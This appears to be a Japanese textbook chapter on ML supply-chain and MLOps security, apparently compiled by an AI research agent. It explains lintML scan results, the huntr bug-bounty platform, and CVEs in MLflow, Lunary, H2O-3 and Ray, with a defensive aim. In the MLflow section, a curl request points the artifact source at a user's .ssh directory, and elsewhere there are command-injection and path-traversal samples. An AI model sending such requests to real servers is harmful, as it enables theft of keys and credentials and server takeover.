- 評価プロセスは「脅威モデリング → パイプライン/アーティファクト検査 → 対立的テストと能力評価 → 根本原因分析 → 報告と改善支援」という5段階で構成される。

このアプローチが示唆するのは、モデルハブのサプライチェーン問題を「pickleを避ければよい」という単一の対策に矮小化せず、**学習データの出所からデプロイ後のエージェント挙動まで、パイプライン全体を一つの攻撃対象領域として扱う**必要があるという点である。

> 出典: Trail of Bits — AI/ML Security Services — https://trailofbits.com/services/ai-ml/

### 学習コード自体に潜む脆弱性: lintMLによる大規模実証分析

モデルファイルだけでなく、それを生成する**学習コード自体**にも古典的な脆弱性パターンが大量に存在することが、NVIDIA AI Red Teamの調査で定量的に示されている。同チームは`lintML`というメタツールを開発した。これは既存の実績あるスキャナである`TruffleHog`（シークレット検出）と`Semgrep`（静的解析）をラップし、ML特化のルールセットと組み合わせて統合的なセキュリティ分析を提供するものである。

```bash
# lintMLの実行例（Semgrepのpythonルール + Trail of Bits ML特化ルールを併用）
lintML --semgrep-options "--config 'p/python' --config 'p/trailofbits'" <directory>

# 個別にTruffleHogでシークレットを検出する場合
docker run --rm -it -v "kaggle:/pwd" trufflesecurity/trufflehog:latest \
  filesystem /pwd --json --only-verified
```

#### 分析対象と規模

NVIDIAは「Meta Kaggle for Code」データセット（約140GB、2020年4月〜2023年8月の期間、約350万件のPythonファイル／Jupyterノートブック）を対象に、162個のSemgrepルール（Python標準ルール＋Trail of Bits提供のML特化ルール）を用いて大規模スキャンを実施した。この規模の実証分析は「MLコードのセキュリティ品質」を定量的に語る上で貴重なデータであり、以降の数値はいずれもこの分析結果に基づく。

#### 検出された主要な脆弱性パターン

**(1) 平文の認証情報のハードコード**

140件以上の**検証済み（有効な）**平文認証情報がコード中に直接記述されているのが発見された。対象はOpenAI、AWS、GitHubなど多岐にわたるサービスのAPIキー・トークン類である。TruffleHogは単に「APIキーらしき文字列パターン」を検出するだけでなく、実際にそのキーが有効かどうかを検証する機能を持つため、「本当に悪用可能な漏洩」を高い精度で抽出できる。これはノートブック文化（Jupyter Notebookでの試行錯誤的な開発）において、認証情報を一時的に直書きしたまま公開リポジトリにコミットしてしまうという、MLエンジニアリング特有の運用習慣が背景にある。

**(2) 安全でないデシリアライゼーション**

```python
feature = np.load(feature_dir + fileName + '.npy', allow_pickle=True)
```

この一見無害なコードには2つの問題が重なっている。第一に`allow_pickle=True`は、NumPyの`.npy`ファイルであってもpickleによる任意オブジェクト復元を許可するフラグであり、前述のpickle脆弱性がここでも同様に成立する。第二に`feature_dir + fileName`という**文字列連結によるパス構築**は、`fileName`が外部入力に由来する場合にパストラバーサル（`../../etc/passwd`のような相対パス指定でディレクトリ境界を越えるファイルアクセスを行う攻撃）を許してしまう可能性がある。この2つが組み合わさることで、「意図しないファイルから、任意コード実行につながるデータを読み込ませる」という複合的なリスクになる。

定量データとしては、pickle関連の関数呼び出しが約5,000件、pandas・joblib・NumPy経由のデシリアライゼーションを含めると45,000件以上のpickleファイル読み込みが検出された一方、より安全な代替手段であるONNX（Open Neural Network Exchange、実行可能コードを含まないモデル交換フォーマット）のインポートはわずか9件に留まった。この非対称性が、MLコミュニティ全体で安全なシリアライゼーション形式への移行がいかに進んでいないかを示している。

**(3) XMLインジェクション**

```python
pandas.read_html()
```

pandasの`read_html`関数は内部的にXMLパーサを使用するため、外部から取得したHTML/XMLコンテンツを処理する際にXML外部実体参照（XXE）攻撃に対して脆弱になりうる。データ収集・前処理の段階でWebスクレイピング結果を無防備に読み込むMLパイプラインでは、この種のパーサ起因の脆弱性が見過ごされやすい。

**(4) 敵対的堅牢性テストの欠如**

Adversarial Robustness Toolbox、Counterfit、TextAttack、CleverHansといった、モデルの敵対的頑健性（adversarial robustness、意図的に細工された入力に対するモデルの誤分類耐性）を評価するためのライブラリのインポートが、大規模データセット中でほぼ見られなかった。同様に、差分プライバシー（学習データに含まれる個人情報を統計的にぼかして保護する技術）を実装するライブラリも、PyDPが1回インポートされたのみで、実質的に使われていないに等しい状態だった。これは脆弱性というより「防御的実践の不在」を示す指標だが、MLセキュリティの成熟度が低いことの傍証として重要である。

**(5) タイポスクワッティング（typosquatting）のリスク**

`panda`（正: `pandas`）、`mathplotlib`（正: `matplotlib`）のような、著名ライブラリ名のスペルミスに酷似したパッケージ名のインポートが検出された。攻撃者がこうした誤記名でパッケージを先回りして公開しておくことで、開発者のタイプミスに便乗して悪意あるコードを実行させる攻撃（サプライチェーン攻撃の一種）が成立しうる。ML分野では特にノートブック環境で`pip install`を頻繁に手打ちする文化があるため、このリスクは他分野以上に現実的である。

#### 防御推奨策

1. **認証情報管理の徹底**: シークレットマネージャーの利用、環境変数への分離、短期発行トークンの採用、多要素認証（MFA）の有効化。
2. **自動化された継続的検査**: プリコミットフックへのTruffleHog等の統合により、コミット前の段階でシークレット漏洩を機械的に検出する。
3. **シリアライゼーション形式の移行**: pickle依存からONNXやProtocol Buffersのような、コード実行を伴わない形式への移行。
4. **敵対的評価の組み込み**: ARTのようなツールのメトリクスをMLパイプラインの評価フレームワークに標準的に組み込む。
5. **アーティファクト供給の制御**: 内部リポジトリの利用、インポートフッキングによる監視、許可/拒否リスト（allow/blocklist）によるパッケージ導入の制御。

なお同分析では、容易に改ざん可能な外部ソースからのシリアライズオブジェクト読み込みや、Google Safe Browsing APIで検出されるマルウェア関連URLへの参照は見つからなかったと報告されており、「MLコードのすべてが危険」というわけではなく、**特定の反復的なパターン（特にpickle依存と認証情報のハードコード）に問題が集中している**という結論が導かれている。

> 出典: NVIDIA Developer Blog — Analyzing the Security of Machine Learning Research Code — https://developer.nvidia.com/blog/analyzing-the-security-of-machine-learning-research-code

### まとめ: モデルハブとMLコードを「サプライチェーンの入口」として扱う

本節で見た3つの資料は、異なる切り口から同一の結論に収斂する。すなわち、機械学習システムのセキュリティは「モデルの重みが正しいか」という統計的な品質の話にとどまらず、**モデルファイルという実行可能なデータ形式、それを扱うパイプライン全体、そしてそれを書く人間のコーディング習慣**という3層すべてにサプライチェーンリスクが存在するということである。

防御の要点を統合すると以下のようになる。

- **フォーマットレベル**: pickle依存の形式（`.pt`, `.pth`, `.ckpt`, `.npy`の`allow_pickle=True`利用など）を避け、`safetensors`やONNXのような実行不可能なデータ形式へ移行する。
- **配布レベル**: モデルの取得元は名前ではなくハッシュでピン止めし、内部レジストリでミラーリングし、隔離環境で初回読み込みを行う。スキャナは「検出できないことがある」という前提（nullifAIのようなパーサ差分攻撃の存在）を踏まえ、単一の防御層に依存しない多層防御を組む。
- **コードレベル**: 認証情報のハードコードを機械的に検出する仕組みをCIに組み込み、ML特化の静的解析ルール（lintMLやfacklingのようなツール）で学習コード・前処理コードを継続的に検査する。

これらはいずれも、Webアプリケーションセキュリティで確立された「信頼できない入力を検証する」「最小権限で実行する」「サプライチェーンの出所を追跡する」という原則をML領域に適用したものに過ぎない。MLエコシステムの急速な拡大速度に対して、これらの基本原則の実装が追いついていない現状こそが、本節で扱った一連の事例が示す本質的な課題である。

## huntr：AI/ML特化バグバウンティ

### huntrとは何か

huntr（huntr.com）は、AI/MLサプライチェーン専門のバグバウンティ・脆弱性開示プラットフォームである。2023年にProtect AI社が買収して独自プラットフォームとして再構築し、その後Protect AI自体が2025年にPalo Alto Networksに買収されたことで、現在はPalo Alto Networks傘下で運営されている。従来のWebアプリ向けバグバウンティ（HackerOne、Bugcrowdなど）が「稼働中の実サービス」を対象にするのに対し、huntrは「OSS（オープンソースソフトウェア）のコードベースそのもの」と「MLモデルファイル形式」を対象にする点が大きく異なる。つまり攻撃対象は本番環境ではなく、GitHub上のリポジトリのコードとモデルファイルパーサである。この違いは、本教科書の「防御目的・実サービスへの無許可検証禁止」というスコープ制約とも相性が良い——huntrでの活動はコードレビューとローカル検証が中心であり、他者の本番システムを直接攻撃する必要がない。

huntrは大きく2種類のバグバウンティ・プログラムを提供する。

- **OSV（Open Source Vulnerabilities）**：OSSのAI/MLアプリケーション・ライブラリ（例：MLflow、Gradio、LangChain系ツール、LLMOpsダッシュボードなど）のコード中の脆弱性を対象とする。SQLインジェクション、パストラバーサル、SSRF、デシリアライゼーション、認可不備（IDOR）など、通常のWebアプリ脆弱性がOSS文脈で報告される。
- **MFV（Model File Vulnerabilities）**：機械学習モデルファイル形式（Pickle、SafeTensors以前のフォーマット、ONNX、Kerasのh5、GGUFなど）のパーサ実装や読み込み処理における脆弱性を対象とする。モデルファイルを読み込むだけで任意コード実行（RCE）に至る、といったクラスが典型例である。

> 出典: Participation Guidelines — https://huntr.com/guidelines

### 参加ガイドライン（huntr.com/guidelines）

`huntr.com/guidelines` はhuntrへの脆弱性提出プロセスと評価基準を定めたページである。WebFetchによる直接取得はJavaScriptで描画されるSPA（シングルページアプリケーション）構成のため本文抽出に失敗したが、WebSearchによる補助情報と関連ドキュメント（FAQ、migration FAQ、IEEE S&P 2025のポスター論文）から要点を再構成できた。以下、要点を整理する。

**提出から報奨までの流れ**

1. 研究者がOSVまたはMFVとして脆弱性を提出する（対象リポジトリ、脆弱性種別、再現手順、影響、修正案などを記載）。
2. OSVの場合、対象OSSのメンテナがhuntr上に招待され、研究者と協議しながら脆弱性の有効性（valid/invalid）を判定する。
3. huntr運営が45日以内のレビューを目標にトリアージする（メンテナの応答が得られない場合はhuntr側で評価を代行することもある）。
4. 有効と判定されれば報奨（バウンティ）が支払われ、該当する場合はCVE番号が採番される。
5. 報奨金は毎月25日前後にStripe Connect経由で振込まれる。

**報奨額の考え方**

huntrの報奨算定で特徴的なのは、「そのバグがAI/MLの中核資産（モデルやトレーニングデータ）に直接影響するか」を問う点である。ガイドラインの評価軸は「この脆弱性はMLモデルやトレーニングデータの読み書きを可能にするか？」という問いに集約され、これに該当する場合は基礎バウンティ額が最大10倍に乗算されることがある。これは、AI/MLシステムでは「モデルの窃取・改ざん」や「トレーニングデータの漏洩・汚染」が単なる情報漏洩以上の資産価値（知財・学習コスト・下流の推論結果すべてへの影響）を持つためである。単純なXSSやDoSよりも、モデルレジストリへの不正アクセスやモデルファイルの改ざんを許す脆弱性の方が高く評価される設計思想が読み取れる。

**対象範囲の考え方（防御目的での要点）**

huntrはOSSのコードベースとモデルファイル形式を対象とするため、実運用中の第三者サービスへの侵入テストとは異なる。研究者は対象OSSをローカル環境（自分のマシンやコンテナ）にセットアップして検証するのが基本であり、本教科書がスコープ制約として掲げる「実在サービス・本番への無許可検証禁止」と自然に整合する活動形態である。ただし、脆弱性が実際にインターネット上で稼働している公開インスタンス（例：デフォルト設定のまま公開されたMLflowサーバなど）に影響し得る場合は、影響の説明にとどめ、実サービスへの実攻撃は行わないという倫理原則が一般的なOSSバグバウンティ同様に適用される。

> ⚠️ **未取得の資料**: 「huntr Participation Guidelines」の本文はJavaScriptレンダリングのため自動取得できませんでした（理由: SPA構成でWebFetchが静的HTMLしか取得できず、実質コンテンツが空になった）。以下のURLからご自身で直接ご覧ください: https://huntr.com/guidelines
> （以下は未取得資料の補足として、WebSearch経由で得られた公開情報と一般知識に基づく解説です。上記の提出フロー・報奨算定・対象範囲の記述はこの前提で書かれている。）

> 出典: Participation Guidelines — https://huntr.com/guidelines

### Hacktivity：受理事例の見方

`huntr.com/bounties/hacktivity` は、huntrで受理・公開された脆弱性報告を新着順に一覧表示するページである。このページもSPAでありWebFetchでは動的に読み込まれるリスト本体（案件タイトル、対象リポジトリ、CVE番号、重大度、公開日）を取得できなかった。WebSearchで確認できた範囲では、例えば以下のような形式のエントリが並ぶ。

- 「Arbitrary File Reading due to Lack of Input Filepath Validation」（`gradio-app/gradio`、High、CVE-2024-0964）
- 「View Barcode Image leads to Remote Code Execution」（`dolibarr/dolibarr`、Critical）

Hacktivityを読む際の実務的な価値は次の3点にある。

1. **狙い目のOSSと脆弱性クラスの相場観がつかめる**：同じOSSに対して過去にどんな脆弱性クラス（パストラバーサル、SSRF、デシリアライゼーション、認可不備）が報告済みかを把握すれば、重複報告を避けつつ「まだ調べられていない機能」に狙いを絞れる。
2. **報奨額の相場感**：重大度（Critical/High/Medium/Low）とAI/ML直接影響の有無から、報奨レンジ（数百ドル〜最大5万ドル程度）のイメージができる。
3. **再現手順・PoCの書き方の学習教材になる**：受理された報告のPoC（curlコマンド、リクエスト例、コードスニペット）は、脆弱性報告のお手本として読める。

> ⚠️ **未取得の資料**: 「huntr Hacktivity」一覧本体（案件の網羅的なリスト）はJavaScriptレンダリングのため自動取得できませんでした（理由: SPA構成でWebFetchが静的な骨格ページのみを返し、一覧データはAPI経由で後から描画されるため）。最新の一覧はご自身で直接ご覧ください: https://huntr.com/bounties/hacktivity

> 出典: Hacktivity — https://huntr.com/bounties/hacktivity

### 実例1：MLflow — SSHキー窃取からRCEへ（CVE-2023-1177）

huntr上で報告されたMLflowの脆弱性（`huntr.com/bounties/1fe8f21a-c438-4cba-9add-e8a5dab94e28`）は、「任意ファイル読み取り（不適切なアクセス制御）」が「サーバ乗っ取り（RCE）」にまで発展する典型的な連鎖を示す事例である。このページ自体もSPAで直接取得はできなかったが、CSO Onlineの解説記事などから技術的な骨子を再構成できる。対応するCVEはCVE-2023-1177（CVSSスコア9.8、ベクタは`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`＝ネットワーク経由・低難度・権限不要・ユーザ操作不要で機密性/完全性/可用性すべてに全面的な影響）である。

**脆弱性の仕組み**

MLflowはモデルのトラッキングサーバであり、モデルのアーティファクト（重みファイルなど）をローカルディスクやS3・GCS・Azure Blobなどのリモートストレージから取得するAPIを備える。この「アーティファクト取得元」を指定するパラメータに、`file://`や`s3://`のようなURIスキームを研究者側で自由に指定できてしまう実装があり、サーバ側で「MLflowが管理するアーティファクトディレクトリ配下のパスであること」を検証していなかった。結果として、`source`パラメータに`file:///home/<user>/.ssh`のような任意のローカルパスを指定すれば、MLflowサーバ権限で読み取れる任意ファイルを取得できてしまう。

```
# 概念的な再現イメージ（実サービスへの無許可実行は禁止。
# 自分のローカル検証環境でのみ確認すること）
curl -X POST http://localhost:5000/ajax-api/2.0/mlflow/artifacts/promote \
     -H "Content-Type: application/json" \
     -d '{"source": "file:///home/danmcinerney/.ssh", "run_id": "..."}'
```

なぜこれが成立するのか。MLflowのアーティファクト取得処理は「ダウンロード元をURIスキームで判定し、`file://`ならローカルファイルシステムアクセス、`s3://`ならboto3経由でS3アクセス、といった具合にハンドラを切り替える」という設計になっている。この切り替え自体は機能として正しいが、**ダウンロード元パスがMLflowの管理下（例えば特定のアーティファクトルート配下）に限定されているかどうかをサーバ側で検証していない**ことが根本原因である。クライアント（＝攻撃者）が任意のURIを指定できる以上、パス制約のないファイルシステムアクセスハンドラはそのまま「任意ファイル読み取りプリミティブ」になる。これはWebアプリのパストラバーサル脆弱性と本質的に同じ構造だが、URIスキーム全体を信頼してしまっている点で「スキーム混同（scheme confusion）」型の脆弱性とも言える（関連する亜種として`huntr.com/bounties/8ea058a7-...`のLFIもスキーム混同に起因する）。

**RCEへの連鎖**

任意ファイル読み取りだけでも重大だが、この脆弱性がクリティカルとされる理由は「読み取れる情報の質」にある。MLflowサーバはS3などのクラウドストレージを扱う都合上、しばしばAWSクレデンシャル（`~/.aws/credentials`）やSSH秘密鍵（`~/.ssh/id_rsa`）をサーバのファイルシステム上に保持している。攻撃者はまずこれらの機密ファイルを窃取し、次のいずれかの経路でRCEに到達する。

- 窃取したSSH秘密鍵を使ってサーバへSSHログインし、直接コマンドを実行する。
- 窃取したAWSクレデンシャルでS3上のモデルアーティファクトや設定を改ざんし、MLflowが後続で読み込む処理（Pythonファイルの上書きなど）を通じて間接的にコード実行に持ち込む。
- 同種のAPIが「任意ファイル書き込み」も許容する場合（huntr上の別報告`huntr.com/bounties/46f7f837-...`など）、MLflowのPythonモジュールファイル自体を攻撃者のコードで上書きし、次回のMLflowプロセス起動・リロード時に任意コードが実行される。

この「読み取り→機密情報窃取→書き込みまたは認証窃取→RCE」という連鎖は、AI/MLOpsツール特有のパターンである。学習・実験管理基盤は往々にして「信頼された内部ネットワークでのみ使う」という前提で設計され、認証や入力検証が後回しにされがちであり、そこに強い権限（クラウドクレデンシャルへのアクセス、ファイルシステムへの書き込み）が結びつくことで被害が増幅される。

**防御の要点**

- アーティファクトのソースURIは、サーバ側で許可されたルートディレクトリ・許可されたスキーム（例：登録済みのS3バケットのみ）にホワイトリスト制約する。
- 実験管理・MLOpsツールを社内ネットワークであっても認証必須で運用し、デフォルト設定のまま公開しない（MLflowは歴史的に認証なしで公開される事故が多発した）。
- サーバプロセスの実行ユーザには最小権限を与え、SSH秘密鍵やクラウドクレデンシャルを同一ホスト・同一ユーザ権限で保持しない（クレデンシャルの分離・シークレットマネージャの利用）。
- パッチ適用：CVE-2023-1177は後続バージョンのMLflowで修正済みであり、対象バージョンを利用している場合は速やかにアップグレードする。

> 出典: MLflow SSHキー窃取からRCE — https://huntr.com/bounties/1fe8f21a-c438-4cba-9add-e8a5dab94e28 ／ 補足: Frequent critical flaws open MLFlow users to imminent threats（CSO Online） — https://www.csoonline.com/article/1293302/frequent-critical-flaws-open-mlflow-users-to-imminent-threats.html

### 実例2：huntrで34件公開 — Lunary AIのIDORとSAML設定改ざん（2024年）

SC Mediaの記事は、Protect AIのhuntrプログラムを通じて公開されたOSSのAI/MLツール34件の脆弱性をまとめたものである。対象にはLunary（LLMOps向けのプロンプト管理・モニタリングプラットフォーム）、Chuanhu Chat（ChatGPT用のWeb UI）、LocalAI（ローカルLLM推論サーバ）などが含まれる。この記事もアクセス時にHTTP 403で直接取得できなかったため、WebSearchで得られた要点を以下にまとめる。

**Lunary AI：CVE-2024-7474（IDOR）とCVE-2024-7475（アクセス制御不備）**

両脆弱性ともCVSSスコア9.1と評価されている。

- **CVE-2024-7474（IDOR：Insecure Direct Object Reference）**：認証済みユーザーが、本来アクセス権を持たない他ユーザーのレコード（ユーザー情報）を、IDなどの識別子を直接指定することで閲覧・削除できてしまう脆弱性。なぜ成立するのか——APIエンドポイントがリクエストされたリソースIDに対して「そのリソースが呼び出し元テナント／ユーザーに属するか」というテナント境界チェック（authorizationチェック）を欠落させていたためである。マルチテナントSaaS的に設計されたAI/MLプラットフォームでは、「認証（authentication）は通っているが認可（authorization）が抜けている」というこの種の不備が典型的な脆弱性クラスになる。
- **CVE-2024-7475（不適切なアクセス制御：SAML設定エンドポイント）**：SAML（Security Assertion Markup Language、シングルサインオン用のXMLベース認証プロトコル）の設定を変更するエンドポイントに対して、権限検証なしにPOSTリクエストで設定変更ができてしまう脆弱性。攻撃者はこれを悪用してSAML設定（IdPのメタデータやエンティティIDなど）を自分の管理する不正なIdP情報に書き換え、以後のSSOログインフローを乗っ取ることで、正規ユーザーになりすましたログイン（認証バイパス）を成立させられる。認証プロトコルの「設定」自体が書き換え可能になると、プロトコルの暗号学的な健全性（署名検証やIdPの真正性）とは無関係に、信頼の起点そのものがすり替えられてしまう点が本質的な危険性である。

両脆弱性はLunary側で修正され、**バージョン1.3.4以降へのアップグレードで対処済み**である（2024年時点の情報）。

**その他の注目事例**

- **Chuanhu Chat：CVE-2024-5982（パストラバーサル、CVSS 9.1）**：ユーザーアップロード機能におけるパストラバーサル脆弱性で、RCE・任意ディレクトリ作成・CSVファイルからの情報漏洩につながる。ファイルアップロード機能でファイル名やパスの正規化・検証を怠ると、`../`のようなパス要素でアップロード先ディレクトリの制約を突破できてしまう、という古典的だが今なおAI系OSSに頻出する脆弱性クラスである。
- **LocalAI：CVE-2024-6983（RCE）およびCVE-2024-7010（タイミング攻撃）**：ローカルLLM推論サーバであるLocalAIにおいて、RCEとタイミングサイドチャネル攻撃（レスポンス時間の差から秘密情報の正誤を推測する攻撃）の両方が報告されている。推論サーバは外部入力（プロンプトやモデル設定）を処理する性質上、パーサやプラグイン機構にRCEの入口が生まれやすい。

この記事から読み取れる教訓は、AI/MLOps系OSSでは「認可の抜け（IDOR）」「認証プロトコル設定の書き換え可能性」「ファイル操作系のパストラバーサル」という、AI固有ではない古典的なWeb脆弱性クラスが依然として主要な攻撃面を占めているという点である。AI/MLならではの脆弱性（モデルファイルのデシリアライゼーションなど）だけでなく、周辺の管理画面・API・認証基盤に対する伝統的なWebセキュリティレビューが引き続き重要であることを示している。

> ⚠️ **未取得の資料**: 「AI bug bounty program yields 34 flaws in open-source tools」（SC Media）の本文はHTTP 403で自動取得できませんでした（理由: サーバ側のボット対策等によるアクセス拒否）。詳細はご自身で直接ご覧ください: https://www.scworld.com/news/ai-bug-bounty-program-yields-34-flaws-in-open-source-tools
> （上記の技術的詳細は、WebSearch経由で得られた同記事の要約情報と、CVE-2024-7474／CVE-2024-7475／CVE-2024-5982等の一般に公開された脆弱性情報に基づく補足解説である。）

> 出典: AI bug bounty program yields 34 flaws in open-source tools — https://www.scworld.com/news/ai-bug-bounty-program-yields-34-flaws-in-open-source-tools

### まとめ：huntrから学ぶAI/MLセキュリティレビューの視点

huntrの事例が示すのは、AI/MLシステムのセキュリティ課題の多くが「AI特有の新しい脆弱性」ではなく、「MLOpsという新しいアプリケーション領域に、認可・入力検証・パス制約といった古典的なWebセキュリティ原則が徹底されていない」ことに起因するという点である。MLflowの任意ファイル読み取りはパストラバーサル／スキーム混同、Lunaryの2件は認可不備、Chuanhu ChatはアップロードパスのCVEというように、脆弱性クラス自体は在来型である。一方で、被害の重大性はAI/ML特有の資産（モデル、トレーニングデータ、実験管理基盤に集まるクラウドクレデンシャル）によって増幅される。この「クラシックな脆弱性クラス × AI/ML特有の高価値資産」という掛け算の構造を理解することが、huntrで成果を出すための、また自組織のMLOps基盤を守るための出発点になる。

防御側の実務としては、(1) アーティファクト・モデルファイルの入出力パスを常にホワイトリストで制約する、(2) MLOpsツールを内部ネットワーク限定と過信せず認証・認可を徹底する、(3) 実験管理サーバのプロセス権限からクラウドクレデンシャルやSSH鍵を分離する、(4) huntrやCVEデータベースで自組織が使うOSSの既知脆弱性とパッチ状況を定期的に確認する、の4点が特に重要である。

## MLOpsツール（MLflow/H2O-3/Ray/ClearML）の実CVE

MLOps（Machine Learning Operations、機械学習のモデル開発・学習・デプロイ・運用を自動化しチームで回すための仕組みと道具立て）を支える基盤ツールは、2023年後半から2024年にかけて「CVSS 10.0（満点）」級の重大脆弱性が立て続けに報告された。これらの多くは、Protect AI社が運営する **huntr**（AI/MLに特化したバグバウンティ・プラットフォーム）に集まった報告から発見されている。

本節では、MLflow・H2O-3・Ray・ClearML の実在CVEを、単なる一覧ではなく「なぜその脆弱性が成立するのか」という原理まで掘り下げて解説する。共通する構造は、**「デフォルトで認証（誰がアクセスしているかの確認）が無く、しかもファイルパスやコマンド引数などの外部入力を検証せず内部の危険な処理（sink＝入力が最終的に実行・解釈される危険な代入先）に流し込む」** という点にある。この構造を理解しておくと、個々のCVE番号を暗記しなくても、同種の欠陥を自分で見抜けるようになる。

> ⚠️ スコープ注意: 本節は防御・設計理解のために書いている。実在サービスや本番環境への無許可な検証、破壊的手順（実際にファイルを上書きする・鍵を奪取するなど）は書かない。CVEの「仕組み」を説明する範囲にとどめ、そのまま流用できる攻撃スクリプトは記載しない。

---

### なぜMLOpsツールは狙われるのか — 前提となる脅威モデル

まず、これらのツールが置かれている典型的な環境を押さえる。

- **デフォルトで認証が無い。** MLflow・H2O-3・Ray はいずれも「ローカルの研究者が便利に使う開発ツール」として設計され、初期状態では Web UI / REST API に認証機構が存在しないか、有効化されていない。データサイエンティストが「とりあえず社内ネットワークに立てて共有する」「クラウドVMに立ててチームに公開する」ことが多く、その結果として **認証なしのAPIがネットワークに露出** する。
- **サーバは高い権限とクレデンシャルを持つ。** 学習サーバはS3などクラウドストレージの認証情報、SSH鍵、モデルファイル、学習データを抱えている。つまり「サーバを乗っ取れれば、そのままクラウド全体・データパイプライン全体に横展開できる」ため、攻撃者にとって非常に価値が高い。
- **入力の信頼境界が曖昧。** モデルファイル・データセット・実験メタデータ・レシピ設定など、外部から来るデータを「安全な内部データ」として扱ってしまう設計が多い。

この3点が重なると、「認証なし ＋ 未検証入力 ＝ 未認証リモートコード実行（RCE、Remote Code Execution：攻撃者が任意のOSコマンド/コードをサーバ上で走らせられる状態）」という最悪のパターンが容易に成立する。実際、以下で見るCVSS 10.0のCVE群は、この最悪パターンそのものである。

> 出典: Over a Dozen Exploitable Vulnerabilities Found in AI/ML Tools — https://www.securityweek.com/over-a-dozen-exploitable-vulnerabilities-found-in-ai-ml-tools/

---

### H2O-3 のCVE群 — Javaオブジェクトの無検証デシリアライズ

**H2O-3** は、GUIやAPIから手軽に機械学習モデルを作れるオープンソースのローコードML基盤（毎月数十万ダウンロード規模）。2023年に4件のCVEが報告された。

| CVE | 種別 | CVSS | 概要 |
|-----|------|------|------|
| CVE-2023-6016 | リモートコード実行（RCE） | **10.0** | 悪意あるJavaオブジェクトをH2O-3に食わせるとそのまま実行される。OSアクセス・モデル/認証情報の窃取・サーバ乗っ取りに至る |
| CVE-2023-6038 | ローカルファイルインクルード（LFI） | — | サーバ上の任意ファイルへの不正な読み取りアクセス |
| CVE-2023-6013 | クロスサイトスクリプティング（XSS） | — | ブラウザ経由の攻撃ベクトル |
| CVE-2023-6017 | S3バケットテイクオーバー | High | クラウドストレージの乗っ取り |

#### CVE-2023-6016（CVSS 10.0）が成立する原理

記事の記述は「攻撃者が悪意あるJavaオブジェクトを供給すると、H2O-3がそれを実行してしまう（supply malicious Java objects that H2O-3 would execute）」である。これは典型的な **安全でないデシリアライズ（insecure deserialization）** の問題だ。仕組みをレベルを落として説明する。

- **デシリアライズとは何か。** プログラムはメモリ上のオブジェクト（データと振る舞いの束）をファイルやネットワークで送れるバイト列に変換（シリアライズ）し、受け取った側がそれをオブジェクトに戻す（デシリアライズ）。JavaのネイティブなシリアライズやモデルのPOJO/MOJO読み込みでは、この「戻す」処理の中でクラスのコンストラクタや特殊メソッドが呼ばれることがある。
- **なぜ実行に至るか。** 攻撃者が「戻す」過程で危険な副作用（外部コマンド実行など）を引き起こすように細工した「ガジェットチェーン」を含むオブジェクトを送り込むと、`readObject` 相当の復元処理がその副作用を発火させる。**受信側が「どのクラスを復元してよいか」をホワイトリストで絞っていない** ため、任意クラスの復元＝任意コード実行になる。
- **なぜ未認証で刺さるか。** H2O-3はデフォルトインストールで認証を持たず、リモートからのオブジェクトアップロードをAPIで受け付ける。したがって認証されていない攻撃者が、ネットワーク経由でこのデシリアライズsinkに直接到達できる。

防御の原則は、(1) 信頼できない入力を言語ネイティブのデシリアライズに絶対に渡さない、(2) どうしても必要ならクラスの許可リストで厳格に制限する、(3) そもそも認証・ネットワーク分離でsinkへの到達路を塞ぐ、の3層である。

> 出典: Over a Dozen Exploitable Vulnerabilities Found in AI/ML Tools — https://www.securityweek.com/over-a-dozen-exploitable-vulnerabilities-found-in-ai-ml-tools/

---

### Ray のCVE群 — シェルコマンドへの引数注入

**Ray** は分散機械学習の学習・推論を並列実行するフレームワーク。2023年に3件のCVEが報告された。

| CVE | 種別 | CVSS | 概要 |
|-----|------|------|------|
| CVE-2023-6019 | コマンドインジェクション | **10.0** | `cpu_profile` フォーマット引数が検証されずシステムコマンドへ挿入され、完全なシステム侵害に至る |
| CVE-2023-6020 | ローカルファイルインクルード（LFI） | Critical | リモートからのファイル読み取り |
| CVE-2023-6021 | ローカルファイルインクルード（LFI） | Critical | 任意ファイルの開示 |

#### CVE-2023-6019（CVSS 10.0）が成立する原理

記事の核心的な記述は「`cpu_profile` フォーマット引数が、システムコマンドに挿入される前に検証されていない（not validated before being inserted in a system command）」である。これは古典的な **OSコマンドインジェクション** で、Webアプリと全く同じ原理がMLフレームワークで再発している。

概念を示す（実際の攻撃コードではなく、原理を説明するための擬似コード）:

```python
# アンチパターン（脆弱な構造の概念図）
fmt = request.params["format"]          # 外部からの未検証入力
os.system(f"pprof -{fmt} profile.out")  # sink: シェルに文字列がそのまま渡る
```

- **なぜ実行されるのか。** `os.system` や `shell=True` のサブプロセス呼び出しは、渡された文字列を **シェルが解釈** する。シェルにとって `;` `|` `&&` `$(...)` `` ` `` などはコマンドの区切りやコマンド置換を意味するメタ文字だ。`format` の値に `svg; <別コマンド>` のようなメタ文字を混ぜると、シェルは「1つのコマンド」ではなく「複数のコマンド」として解釈し、攻撃者の追加コマンドを実行してしまう。
- **なぜ「フォーマット引数」なのか。** 開発者は `format` を「`svg` や `pdf` のような固定の選択肢しか来ない安全な値」と思い込みがちだ。しかし列挙（許可リスト）で縛られていなければ、そこは任意文字列の入口になる。**「ユーザーが選ぶ限られたオプション」という思い込みが検証を省かせる** のが典型的な発生パターンである。
- **未認証RCEへ。** Rayもデフォルトで認証を欠くため、ダッシュボード/ジョブAPIにネットワーク到達できる攻撃者がこのsinkに直接届く。結果は「完全なシステム侵害（full system compromise）」。

防御は、(1) シェルを経由しない（`subprocess.run([...], shell=False)` のように引数を配列で渡し、シェル解釈を挟まない）、(2) `format` を厳格な許可リスト（`{"svg","pdf","proto"}` など）で検証する、(3) 認証とネットワーク分離、である。特に (1) の「配列渡し」は、メタ文字がシェルに解釈される経路そのものを消すため根治的だ。

> 出典: Over a Dozen Exploitable Vulnerabilities Found in AI/ML Tools — https://www.securityweek.com/over-a-dozen-exploitable-vulnerabilities-found-in-ai-ml-tools/

補足として、Rayの一連の問題（特にダッシュボード/ジョブサブミッションAPIの未認証RCE）は、その後 CVE-2023-48022（通称「ShadowRay」）として大規模に悪用された事例でも知られる。Anyscale（Ray開発元）は「認証はデプロイ側の責任範囲」との立場を取り、境界の外に置く前提の設計であった点が論争になった。運用者は **Rayのクラスタを絶対にインターネットへ直接露出させず、ネットワーク分離と認証プロキシの背後に置く** ことが必須である。

---

### MLflow のCVE群 — パストラバーサルとファイル操作sinkの宝庫

